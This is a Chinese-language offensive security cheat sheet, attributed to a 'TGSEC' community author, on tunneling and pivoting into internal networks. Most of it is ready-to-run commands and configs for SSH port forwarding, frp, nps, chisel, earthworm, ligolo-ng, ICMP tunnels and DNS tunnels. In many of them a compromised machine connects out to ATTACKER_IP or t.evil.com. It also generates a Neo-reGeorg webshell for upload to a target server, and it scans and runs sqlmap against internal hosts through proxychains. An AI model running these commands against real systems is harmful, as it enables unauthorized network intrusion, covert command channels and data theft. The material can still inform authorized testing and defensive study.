# 隧道与代理技术

> @TGSEC社区 · @TGSEC-Qtzuu 整理

## 一、SSH隧道

### 本地端口转发(访问内网服务)
```bash
# 将本地8080映射到目标内网192.168.1.100:80
ssh -L 8080:192.168.1.100:80 user@jumphost
# 访问 http://localhost:8080 即可访问内网Web

# 后台运行
ssh -fNL 8080:192.168.1.100:80 user@jumphost
```

### 远程端口转发(内网机器反连)
```bash
# 在内网机器执行,将内网80端口暴露到攻击机的8080
ssh -R 8080:127.0.0.1:80 attacker@ATTACKER_IP
# 攻击机访问 localhost:8080 即内网80
```

### 动态端口转发(SOCKS代理)
```bash
# 建立SOCKS5代理
ssh -D 1080 user@jumphost
# 配合proxychains使用
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains nmap -sT 192.168.1.0/24
```

### SSH over HTTP(通过Web代理)
```bash
# 使用corkscrew
apt install corkscrew
# ~/.ssh/config
Host target
    ProxyCommand corkscrew proxy.corp.com 8080 %h %p
    Hostname real-target.com
    User root
```

### 多层SSH跳板
```bash
ssh -J user1@jump1,user2@jump2 user3@target
# 等价于 ProxyJump
```

## 二、frp内网穿透

### 服务端(frps.ini) — 攻击机
```ini
[common]
bind_port = 7000
dashboard_port = 7500
dashboard_user = admin
dashboard_pwd = admin123
token = mysecrettoken
```

### 客户端(frpc.ini) — 内网机器
```ini
[common]
server_addr = ATTACKER_IP
server_port = 7000
token = mysecrettoken

[ssh]
type = tcp
local_ip = 127.0.0.1
local_port = 22
remote_port = 6000

[web]
type = tcp
local_ip = 192.168.1.100
local_port = 80
remote_port = 8080

[socks5]
type = tcp
remote_port = 1080
plugin = socks5
```

```bash
# 启动
./frps -c frps.ini   # 攻击机
./frpc -c frpc.ini   # 内网
# 攻击机 ssh -p 6000 user@127.0.0.1 即可连内网SSH
```

## 三、nps内网穿透

### 服务端
```bash
./nps install && nps start
# Web管理: http://ATTACKER:8080 admin/123
```

### 客户端
```bash
./npc -server=ATTACKER:8024 -vkey=xxx -type=tcp
```

## 四、chisel

```bash
# 攻击机(服务端)
./chisel server -p 8888 --reverse

# 内网机器(客户端)
# SOCKS5代理
./chisel client ATTACKER:8888 R:1080:socks

# 端口转发
./chisel client ATTACKER:8888 R:3306:192.168.1.100:3306
```

## 五、Neo-reGeorg

```bash
# 1. 生成webshell
python3 neoreg.py generate -k password123
# 上传tunnel.php到目标Web服务器

# 2. 建立隧道
python3 neoreg.py -k password123 -u http://target.com/tunnel.php
# 默认SOCKS5代理: 127.0.0.1:1080

# 配合proxychains
proxychains nmap -sT -Pn 192.168.1.0/24
```

## 六、earthworm(ew)

```bash
# 正向SOCKS代理(目标机器可达)
./ew -s ssocksd -l 1080

# 反向SOCKS代理
# 攻击机:
./ew -s rcsocks -l 1080 -e 8888
# 目标机:
./ew -s rssocks -d ATTACKER_IP -e 8888

# 多级代理
# 一级: ./ew -s rcsocks -l 1080 -e 8888
# 二级: ./ew -s lcx_slave -d ATTACKER -e 8888 -f 内网B -g 9999
# 三级: ./ew -s ssocksd -l 9999
```

## 七、ICMP隧道

### icmpsh
```bash
# 攻击机(关闭ICMP应答)
sysctl -w net.ipv4.icmp_echo_ignore_all=1
python3 icmpsh_m.py ATTACKER_IP TARGET_IP

# 目标机
./icmpsh.exe -t ATTACKER_IP
```

### pingtunnel
```bash
# 攻击机
./pingtunnel -type server

# 目标机(将TCP流量封装进ICMP)
./pingtunnel -type client -l :4455 -s ATTACKER_IP -t ATTACKER_IP:4455 -tcp 1
```

## 八、DNS隧道

### dnscat2
```bash
# 攻击机
ruby dnscat2.rb --dns "domain=t.evil.com" --secret=mysecret

# 目标机
./dnscat --dns "domain=t.evil.com" --secret=mysecret
```

### iodine
```bash
# 攻击机(需要域名NS记录指向攻击机)
iodined -f -c -P password 10.0.0.1 t.evil.com

# 目标机
iodine -f -P password t.evil.com
# 建立tun隧道 10.0.0.1 <-> 10.0.0.2
ssh root@10.0.0.1 -D 1080  # 再建SOCKS
```

## 九、Proxychains配置

```bash
# /etc/proxychains4.conf
strict_chain        # 严格链(依次连接)
# dynamic_chain    # 动态链(跳过不可用的)
# random_chain     # 随机链

[ProxyList]
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081   # 多级代理
# http   10.0.0.1 8080  # HTTP代理

# 使用
proxychains curl http://192.168.1.100
proxychains nmap -sT -Pn 192.168.1.0/24
proxychains sqlmap -u "http://internal/vuln?id=1"
proxychains ssh user@192.168.1.100
```

## 十、ligolo-ng(新一代隧道)

```bash
# 攻击机
./proxy -selfcert -laddr 0.0.0.0:11601

# 目标机
./agent -connect ATTACKER:11601 -ignore-cert

# 攻击机操作
ligolo» session         # 选择session
ligolo» ifconfig        # 查看内网网段
ligolo» start           # 启动隧道

# 添加路由
sudo ip route add 192.168.1.0/24 dev ligolo
# 直接访问内网!无需proxychains
nmap -sT 192.168.1.0/24
```
